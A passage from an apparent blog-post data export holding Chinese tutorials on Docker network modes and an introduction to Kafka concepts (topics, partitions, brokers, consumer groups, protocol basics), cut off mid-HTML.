pair虚拟网络设备对，进行通信的。一个在容器上，另一个在宿主机上。</p>\n\n<p>每创建一个基于bridge网络的容器，都会自动在宿主机上创建一个veth**虚拟网络设备。</p>\n\n<p>外部无法直接访问容器。需要建立端口映射才能访问。</p>\n\n<p>容器借由veth虚拟设备通过如docker0这种bridge网络设备进行通信。</p>\n\n<p>每一容器具有单独的IP</p>\n\n<p><img alt=\"\" class=\"has\" height=\"286\" src=\"https://img-blog.csdnimg.cn/20190424232014727.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\" width=\"477\"></p>\n\n<p><strong>bridge 网络模式（二） – 端口映射</strong></p>\n\n<p>作用：     启动的容器时，为容器进行端口映射</p>\n\n<p>命令格式：     docker run/create -P …       或者 docker run/create –p …</p>\n\n<p>命令参数(OPTIONS)：     -P, --publish-all        将容器内部所有暴露端口进行随机映射     </p>\n\n<p>                                          -p, --publish list     手动指定端口映射</p>\n\n<p>注意：     -p [HOST_IP]:[HOST_PORT]:CONTAINER_PORT     </p>\n\n<p>                如：-p ::80        将容器的80端口随机(端口)映射到宿主机任意IP           </p>\n\n<p>                       -p :8000:6379     将容器的6379端口映射到宿主机任意IP的8000端口           </p>\n\n<p>                       -p 192.168.5.1::3306    将容器的3306端口随机(端口)映射到宿主机的192.168.5.1IP上</p>\n\n<p><img alt=\"\" class=\"has\" height=\"248\" src=\"https://img-blog.csdnimg.cn/20190424232146332.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\" width=\"358\"></p>\n\n<p><strong>host 网络模式</strong></p>\n\n<p>特点：</p>\n\n<p>容器完全共享宿主机的网络。网络没有隔离。宿主机的网络就是容器的网络。</p>\n\n<p>容器、主机上的应用所使用的端口不能重复。例如：如果宿主机已经占用了8090端口，那么任何一个host模式的容器都不可以使用8090端口了；反之同理。</p>\n\n<p>外部可以直接访问容器，不需要端口映射。</p>\n\n<p>容器的IP就是宿主机的IP</p>\n\n<p><img alt=\"\" class=\"has\" height=\"210\" src=\"https://img-blog.csdnimg.cn/20190424232302622.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\" width=\"521\"></p>\n\n<p><strong>特殊host 网络模式（Container网络模式）</strong></p>\n\n<p>Container网络模式，其实就是容器共享其他容器的网络。</p>\n\n<p>相当于该容器,，在网络层面上，将其他容器作为“主机”。它们之间的网络没有隔离。</p>\n\n<p>这些容器之间的特性同host模式。</p>\n\n<p>使用方法：     Docker run/create --network container:CONTAINER …</p>\n\n<p><img alt=\"\" class=\"has\" height=\"262\" src=\"https://img-blog.csdnimg.cn/20190424232401730.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\" width=\"388\"></p>\n\n<p><strong>none 网络模式</strong></p>\n\n<p>特点：</p>\n\n<p>容器上没有网络，也无任何网络设备。</p>\n\n<p>如果需要使用网络，需要用户自行安装与配置。</p>\n\n<p>应用场景</p>\n\n<p>该模式适合需要高度定制网络的用户使用<strong>。</strong></p>\n\n<p><strong>overlay 网络模式（一）</strong></p>\n\n<p>Overlay 网络，也称为覆盖网络。</p>\n\n<p>Overlay 网络的实现方式和方案有多种。Docker自身集成了一种，基于VXLAN隧道技术实现。</p>\n\n<p>Overlay 网络主要用于实现跨主机容器之间的通信。</p>\n\n<p>应用场景：需要管理成百上千个跨主机的容器集群的网络时。</p>\n\n<p><strong>overlay 网络模式（二）- 了解TCP/IP协议栈</strong></p>\n\n<p><img alt=\"\" class=\"has\" height=\"422\" src=\"https://img-blog.csdnimg.cn/2019042423260497.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\" width=\"470\"></p>\n\n<p><strong>overlay 网络模式（三）- 实现原理</strong></p>\n\n<p><strong>IP隧道网络原理</strong></p>\n\n<p><img alt=\"\" class=\"has\" height=\"76\" src=\"https://img-blog.csdnimg.cn/20190424232635739.png\" width=\"372\"></p>\n\n<p><img alt=\"\" class=\"has\" height=\"360\" src=\"https://img-blog.csdnimg.cn/20190424232651416.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\" width=\"469\"></p>\n\n<p><strong>macvlan 网络模式</strong></p>\n\n<p>macvlan网络模式，最主要的特征就是他们的通信会直接基于mac地址进行转发。</p>\n\n<p>这时宿主机其实充当一个二层交换机。Docker会维护着一个MAC地址表，当宿主机网络收到一个数据包后，直接根据mac地址找到对应的容器，再把数据交给对应的容器。</p>\n\n<p>容器之间可以直接通过IP互通，通过宿主机上内建的虚拟网络设备（创建macvlan网络时自动创建），但与主机无法直接利用IP互通。</p>\n\n<p>应用场景：由于每个外来的数据包的目的mac地址就是容器的mac地址，这时每个容器对于外面网络来说就相当于一个真实的物理网络设备。因此当需要让容器来的网络看起来是一个真实的物理机时，使用macvlan模式</p>\n\n<p><img alt=\"\" class=\"has\" height=\"389\" src=\"https://img-blog.csdnimg.cn/20190424232808436.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\" width=\"383\"></p>\n\n<h2>三、总结</h2>\n\n<p>重点掌握： bridge网络、host网络、Container网络模式的原理和使用（应用得较多，且host网络性能最优）。 docker network命令的使用</p>\n\n<p>了解： none网络的效果 overlay网络、macvlan网络的原理。（使用起来难度较大）</p>\n                                    </div>", "log_PostTime": 1584891105, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "Kafka入门教程与详解", "log_Intro": "Kafka入门教程与详解", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <h1 id=\"1-kafka入门教程\" style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\"><strong>1 Kafka入门教程</strong></span></h1>\n\n<p style=\"margin-left:0px;\"> </p>\n\n<h2 id=\"11-消息队列message-queue\" style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\"><strong><a name=\"t1\"></a>1.1 消息队列（Message Queue)</strong></span></h2>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\">Message Queue消息传送系统提供传送服务。消息传送依赖于大量支持组件，这些组件负责处理连接服务、消息的路由和传送、持久性、安全性以及日志记录。消息服务器可以使用一个或多个代理实例。</span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\">JMS（Java Messaging Service）是Java平台上有关面向消息中间件(MOM)的技术规范，它便于消息系统中的Java应用程序进行消息交换,并且通过提供标准的产生、发送、接收消息的接口简化企业应用的开发，翻译为Java消息服务。</span></p>\n\n<p style=\"margin-left:0px;\"> </p>\n\n<h2 id=\"12-mq消息模型\" style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\"><strong><a name=\"t2\"></a>1.2 MQ消息模型</strong></span></h2>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\"><img alt=\"\" class=\"has\" src=\"https://img-blog.csdn.net/20160421172524740?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQv/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center\"></span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\"><em>KafkaMQ消息模型图1-1</em></span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\"> </span></p>\n\n<h2 id=\"13-mq消息队列分类\" style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\"><strong><a name=\"t3\"></a>1.3 MQ消息队列分类</strong></span></h2>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\">消息队列分类：点对点和发布/订阅两种：</span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\">1、点对点：</span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\">消息生产者生产消息发送到queue中，然后消息消费者从queue中取出并且消费消息。</span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\">消息被消费以后，queue中不再有存储，所以消息消费者不可能消费到已经被消费的消息。Queue支持存在多个消费者，但是对一个消息而言，只会有一个消费者可以消费。</span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\">2、发布/订阅：</span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\">消息生产者（发布）将消息发布到topic中，同时有多个消息消费者（订阅）消费该消息。和点对点方式不同，发布到topic的消息会被所有订阅者消费。</span></p>\n\n<p style=\"margin-left:0px;\"> </p>\n\n<h2 id=\"14-mq消息队列对比\" style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\"><strong><a name=\"t4\"></a>1.4 MQ消息队列对比</strong></span></h2>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\">1、RabbitMQ：支持的协议多，非常重量级消息队列，对路由(Routing)，负载均衡(Loadbalance)或者数据持久化都有很好的支持。</span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\"> </span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\">2、ZeroMQ：号称最快的消息队列系统，尤其针对大吞吐量的需求场景，擅长的高级/复杂的队列，但是技术也复杂，并且只提供非持久性的队列。</span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\"> </span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\">3、ActiveMQ：Apache下的一个子项，类似ZeroMQ，能够以代理人和点对点的技术实现队列。</span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\"> </span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\">4、Redis：是一个key-Value的NOSql数据库，但也支持MQ功能，数据量较小，性能优于RabbitMQ，数据超过10K就慢的无法忍受。</span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\"> </span></p>\n\n<h2 id=\"15-kafka简介\" style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\"><strong><a name=\"t5\"></a>1.5 Kafka简介</strong></span></h2>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\">Kafka是分布式发布-订阅消息系统,它最初由 LinkedIn 公司开发，使用 Scala语言编写,之后成为 Apache 项目的一部分。在Kafka集群中，没有“中心主节点”的概念，集群中所有的服务器都是对等的，因此，可以在不做任何配置的更改的情况下实现服务器的的添加与删除，同样的消息的生产者和消费者也能够做到随意重启和机器的上下线。</span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\"> <img alt=\"\" class=\"has\" src=\"https://img-blog.csdn.net/20160421172554912?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQv/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center\"></span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\"><em>Kafka消息系统生产者和消费者部署关系图1-2</em></span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\"><img alt=\"\" class=\"has\" src=\"https://img-blog.csdn.net/20160421172632084?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQv/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center\"></span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\"><em>Kafka消息系统架构图1-3</em></span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\"><em> </em></span></p>\n\n<h2 id=\"16-kafka术语介绍\" style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\"><strong><a name=\"t6\"></a>1.6 Kafka术语介绍</strong></span></h2>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\">1、消息生产者：即：Producer，是消息的产生的源头，负责生成消息并发送到Kafka</span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\">服务器上。</span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\"> </span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\">2、消息消费者：即：Consumer，是消息的使用方，负责消费Kafka服务器上的消息。</span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\"> </span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\">3、主题：即：Topic，由用户定义并配置在Kafka服务器，用于建立生产者和消息者之间的订阅关系：生产者发送消息到指定的Topic下，消息者从这个Topic下消费消息。</span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\"> </span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\">4、消息分区：即：Partition，一个Topic下面会分为很多分区，例如：“kafka-test”这个Topic下可以分为6个分区，分别由两台服务器提供，那么通常可以配置为让每台服务器提供3个分区，假如服务器ID分别为0、1，则所有的分区为0-0、0-1、0-2和1-0、1-1、1-2。Topic物理上的分组，一个 topic可以分为多个 partition，每个 partition 是一个有序的队列。partition中的每条消息都会被分配一个有序的 id（offset）。</span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\"> </span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\">5、Broker：即Kafka的服务器，用户存储消息，Kafa集群中的一台或多台服务器统称为 broker。</span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\"> </span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\">6、消费者分组：Group，用于归组同类消费者，在Kafka中，多个消费者可以共同消息一个Topic下的消息，每个消费者消费其中的部分消息，这些消费者就组成了一个分组，拥有同一个分组名称，通常也被称为消费者集群。</span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\"> </span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\">7、Offset：消息存储在Kafka的Broker上，消费者拉取消息数据的过程中需要知道消息在文件中的偏移量，这个偏移量就是所谓的Offset。</span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\"> </span></p>\n\n<h2 id=\"17-kafka中broker\" style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\"><strong><a name=\"t7\"></a>1.7 Kafka中Broker</strong></span></h2>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\">1、Broker：即Kafka的服务器，用户存储消息，Kafa集群中的一台或多台服务器统称为 broker。</span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\"> </span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\">2、Message在Broker中通Log追加的方式进行持久化存储。并进行分区（patitions)。</span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\"> </span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\">3、为了减少磁盘写入的次数,broker会将消息暂时buffer起来,当消息的个数(或尺寸)达到一定阀值时,再flush到磁盘,这样减少了磁盘IO调用的次数。</span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\"> </span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\">4、Broker没有副本机制，一旦broker宕机，该broker的消息将都不可用。Message消息是有多份的。</span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\"> </span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\">5、Broker不保存订阅者的状态，由订阅者自己保存。</span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\"> </span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\">6、无状态导致消息的删除成为难题（可能删除的消息正在被订阅），kafka采用基于时间的SLA(服务水平保证)，消息保存一定时间（通常为7天）后会被删除。</span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\"> </span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\">7、消息订阅者可以rewind back到任意位置重新进行消费，当订阅者故障时，可以选择最小的offset(id)进行重新读取消费消息。</span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\"> </span></p>\n\n<h2 id=\"18-kafka的message组成\" style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\"><strong><a name=\"t8\"></a>1.8 Kafka的Message组成</strong></span></h2>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\">1、Message消息：是通信的基本单位，每个 producer 可以向一个 topic（主题）发布一些消息。</span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\"> </span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\">2、Kafka中的Message是以topic为基本单位组织的，不同的topic之间是相互独立的。每个topic又可以分成几个不同的partition(每个topic有几个partition是在创建topic时指定的)，每个partition存储一部分Message。</span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\"> </span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\">3、partition中的每条Message包含了以下三个属性：</span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\">offset      即：消息唯一标识:对应类型：long</span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\">MessageSize 对应类型：int32</span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\">data        是message的具体内容。</span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\"> </span></p>\n\n<h2 id=\"19-kafka的partitions分区\" style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\"><strong><a name=\"t9\"></a>1.9 Kafka的Partitions分区</strong></span></h2>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\">1、Kafka基于文件存储.通过分区，可以将日志内容分散到多个server上,来避免文件尺寸达到单机磁盘的上限，每个partiton都会被当前server(kafka实例)保存。</span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\"> </span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\">2、可以将一个topic切分多任意多个partitions，来消息保存/消费的效率。</span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\"> </span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\">3、越多的partitions意味着可以容纳更多的consumer，有效提升并发消费的能力。</span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\"> </span></p>\n\n<h2 id=\"110-kafka的consumers\" style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\"><strong><a name=\"t10\"></a>1.10 Kafka的Consumers</strong></span></h2>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\">1、消息和数据消费者，订阅 topics并处理其发布的消息的过程叫做 consumers。</span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\"> </span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\">2、在 kafka中,我们可以认为一个group是一个“订阅者”，一个Topic中的每个partions，只会被一个“订阅者”中的一个consumer消费，不过一个 consumer可以消费多个partitions中的消息（消费者数据小于Partions的数量时）。注意：kafka的设计原理决定，对于一个topic，同一个group中不能有多于partitions个数的consumer同时消费，否则将意味着某些consumer将无法得到消息。</span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\"> </span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\">3、一个partition中的消息只会被group中的一个consumer消息。每个group中consumer消息消费互相独立。</span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\"> </span></p>\n\n<h2 id=\"111-kafka的持久化\" style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\"><strong><a name=\"t11\"></a>1.11 Kafka的持久化</strong></span></h2>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\">1、一个Topic可以认为是一类消息，每个topic将被分成多partition(区),每个partition在存储层面是append log文件。任何发布到此partition的消息都会被直接追加到log文件的尾部，每条消息在文件中的位置称为offset（偏移量），partition是以文件的形式存储在文件系统中。</span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\"> </span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\">2、Logs文件根据broker中的配置要求,保留一定时间后删除来释放磁盘空间。</span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\">        <img alt=\"\" class=\"has\" src=\"https://img-blog.csdn.net/20160421172657875?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQv/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center\"></span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\"><em>Kafka消息分区Partition图1-4</em></span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\"> </span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\">Partition：</span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\">   Topic物理上的分组，一个 topic可以分为多个 partition，每个 partition 是一个有序的队列。partition中的每条消息都会被分配一个有序的 id（offset）。</span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\"> </span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\">3、为数据文件建索引：稀疏存储，每隔一定字节的数据建立一条索引。下图为一个partition的索引示意图：</span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\">       <img alt=\"\" class=\"has\" src=\"https://img-blog.csdn.net/20160421172716657?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQv/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center\"></span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\"><em>Kafka消息分区Partition索引图1-5</em></span></p>\n\n<h2 id=\"112-kafka的分布式实现\" style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\"><strong><a name=\"t12\"></a>1.12 Kafka的分布式实现：</strong></span></h2>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\">     <img alt=\"\" class=\"has\" src=\"https://img-blog.csdn.net/20160421172800304?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQv/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center\"></span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\"><em>Kafka分布式关系图1-6</em></span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\">        <img alt=\"\" class=\"has\" src=\"https://img-blog.csdn.net/20160421172822799?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQv/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center\"></span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\"><em>Kafka生产环境关系图1-7</em></span></p>\n\n<h2 id=\"113-kafka的通讯协议\" style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\"><strong><a name=\"t13\"></a>1.13 Kafka的通讯协议：</strong></span></h2>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\">1、Kafka的Producer、Broker和Consumer之间采用的是一套自行设计基于TCP层的协议，根据业务需求定制，而非实现一套类似ProtocolBuffer的通用协议。</span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\"> </span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\">2、基本数据类型：（Kafka是基于Scala语言实现的，类型也是Scala中的数据类型）</span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\"> </span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\"><strong>定长数据类型</strong>：int8,int16,int32和int64，对应到Java中就是byte, short, int和long。</span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\"> </span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\"><strong>变长数据类型</strong>：bytes和string。变长的数据类型由两部分组成，分别是一个有符号整数N(表示内容的长度)和N个字节的内容。其中，N为-1表示内容为null。bytes的长度由int32表示，string的长度由int16表示。</span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\"> </span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\"><strong>数组</strong>：数组由两部分组成，分别是一个由int32类型的数字表示的数组长度N和N个元素。</span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\"> </span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\">3、Kafka通讯的基本单位是Request/Response。</span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\"> </span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\">4、基本结构：</span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\">RequestOrResponse =&gt; MessageSize(RequestMessage | ResponseMessage)</span></p>\n\n<table border=\"1\" cellspacing=\"0\"><tbody><tr><td style=\"border-color:#dddddd;vertical-align:top;\">\n\t\t\t<p style=\"margin-left:0px;\"><span style=\"color:rgba(0,0,0,.75);\"><span style=\"color:#4f4f4f;\"><span style=\"color:#4f4f4f;\">名称</span></span></span></p>\n\t\t\t</td>\n\t\t\t<td style=\"border-color:#dddddd;vertical-align:top;\">\n\t\t\t<p style=\"margin-left:0px;\"><span style=\"color:rgba(0,0,0,.75);\"><span style=\"color:#4f4f4f;\"><span style=\"color:#4f4f4f;\">类型</span></span></span></p>\n\t\t\t</td>\n\t\t\t<td style=\"border-color:#dddddd;vertical-align:top;\">\n\t\t\t<p style=\"margin-left:0px;\"><span style=\"color:rgba(0,0,0,.75);\"><span style=\"color:#4f4f4f;\"><span style=\"color:#4f4f4f;\">描术</span></span></span></p>\n\t\t\t</td>\n\t\t</tr><tr><td style=\"border-color:#dddddd;vertical-align:top;\">\n\t\t\t<p style=\"margin-left:0px;\"><span style=\"color:rgba(0,0,0,.75);\"><span style=\"color:#4f4f4f;\"><span style=\"color:#4f4f4f;\">MessageSize</span></span></span></p>\n\t\t\t</td>\n\t\t\t<td style=\"border-color:#dddddd;vertical-align:top;\">\n\t\t\t<p style=\"margin-left:0px;\"><span style=\"color:rgba(0,0,0,.75);\"><span style=\"color:#4f4f4f;\"><span style=\"color:#4f4f4f;\">int32</span></span></span></p>\n\t\t\t</td>\n\t\t\t<td style=\"border-color:#dddddd;vertical-align:top;\">\n\t\t\t<p style=\"margin-left:0px;\"><span style=\"color:rgba(0,0,0,.75);\"><span style=\"color:#4f4f4f;\"><span style=\"color:#4f4f4f;\">表示RequestMessage或者ResponseMessage的长度</span></span></span></p>\n\n\t\t\t<p style=\"margin-left:0px;\"><span style=\"color:rgba(0,0,0,.75);\"><span style=\"color:#4f4f4f;\"><span style=\"color:#4f4f4f;\"> </span></span></span></p>\n\t\t\t</td>\n\t\t</tr><tr><td style=\"border-color:#dddddd;vertical-align:top;\">\n\t\t\t<p style=\"margin-left:0px;\"><span style=\"color:rgba(0,0,0,.75);\"><span style=\"color:#4f4f4f;\"><span style=\"color:#4f4f4f;\">RequestMessage</span></span></span></p>\n\n\t\t\t<p style=\"margin-left:0px;\"><span style=\"color:rgba(0,0,0,.75);\"><span style=\"color:#4f4f4f;\"><span style=\"color:#4f4f4f;\">ResponseMessage</span></span></span></p>\n\t\t\t</td>\n\t\t\t<td style=\"border-color:#dddddd;vertical-align:top;\">\n\t\t\t<p style=\"margin-left:0px;\"><span style=\"color:rgba(0,0,0,.75);\"><span style=\"color:#4f4f4f;\"><span style=\"color:#4f4f4f;\">—</span></span></span></p>\n\t\t\t</td>\n\t\t\t<td style=\"border-color:#dddddd;vertical-align:top;\">\n\t\t\t<p style=\"margin-left:0px;\"><span style=\"color:rgba(0,0,0,.75);\"><span style=\"color:#4f4f4f;\"><span style=\"color:#4f4f4f;\"> </span></span></span></p>\n\t\t\t</td>\n\t\t</tr></tbody></table><p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\"> </span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\"> </span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\">5、通讯过程：</span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\">客户端打开与服务器端的Socket</span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\">往Socket写入一个int32的数字(数字表示这次发送的Request有多少字节)</span></p>\n\n<p style=\"margin-left:0px;\"><span 